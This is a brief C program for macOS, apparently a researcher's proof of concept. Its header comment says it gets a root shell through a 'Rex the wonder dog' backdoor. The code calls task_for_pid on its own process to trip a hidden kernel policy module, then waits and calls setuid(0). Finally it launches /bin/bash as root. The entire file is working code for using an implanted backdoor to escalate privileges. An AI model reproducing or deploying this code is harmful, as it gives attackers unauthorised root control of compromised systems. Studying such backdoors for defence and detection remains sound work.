/*
  Get a r00tshell from Rex the wonder dog backdoor

  fG! - reverser@put.as
 
  v0.2
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <mach/mach.h>

int main(void)
{
 char *cmd[] = { "/bin/bash", (char *)0 };
 mach_port_t myself, target;
 myself = mach_task_self();
 printf("[info] calling task_for_pid()\n");
 kern_return_t kr;
 kr = task_for_pid(myself, getpid(), &target);
 printf("[info] task for pid returned %d\n", kr);
 // sleep so policy module has enough time to act
 sleep(2);
 printf("[info] uid %d euid %d\n", getuid(), geteuid());
 printf("[info] setting uid to 0...\n");
 setuid(0);
 printf("[info] uid %d euid %d\n", getuid(), geteuid());
 printf("[info] executing r00t shell...\n");
 execv("/bin/bash", cmd);
 printf("error!\n");
 exit(1);
}
